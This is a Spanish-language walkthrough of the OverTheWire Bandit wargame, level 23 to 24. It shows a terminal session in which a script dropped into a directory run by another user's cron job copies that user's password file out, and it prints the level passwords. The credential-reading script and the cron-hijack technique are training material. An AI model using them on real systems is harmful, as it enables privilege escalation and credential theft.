## Objetivo

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de Acceso al Nivel

```
username: bandit23
psw: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

## Solución 1
```bash
C:\Users\pac61>ssh bandit23@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit23@bandit.labs.overthewire.org's password:

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mktemp -d
/tmp/tmp.v7tSltdBT5
bandit23@bandit:~$ chmod 777 /tmp/tmp.v7tSltdBT5
bandit23@bandit:~$ cd /tmp/tmp.v7tSltdBT5
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/tmp.v7tSltdBT5$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:44 .
drwxrwx-wt 4043 root     root     11063296 Sep  4 16:44 ..
-rw-rw-r--    1 bandit23 bandit23       73 Sep  4 16:44 script.sh
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 73 Sep  4 16:44 script.sh
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ cat script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.v7tSltdBT5/password
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ touch password
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ chmod 777 password
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ ls -la
total 10816
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 16:45 .
drwxrwx-wt 4044 root     root     11063296 Sep  4 16:45 ..
-rwxrwxrwx    1 bandit23 bandit23        0 Sep  4 16:45 password
-rwxrwxrwx    1 bandit23 bandit23       73 Sep  4 16:44 script.sh
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.v7tSltdBT5$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:/tmp/tmp.v7tSltdBT5$
```

# Información obtenida
```
pwd level 24: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
## Notas Adicionales
- mktemp -d - crea una carpeta temporal dentro de /tmp y le asigna un nombre aleatorio
- de preferencia crear el script con un nombre único
# Commands you may need to solve this level
chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
## Referencias
- [¿Qué es cron?](https://opensource.com/article/21/7/cron-linux#:~:text=SA%20Seth%20Kenlon-,The%20cron%20system%20is%20a%20method%20to%20automatically%20run%20commands,user%20to%20automate%20their%20computer.)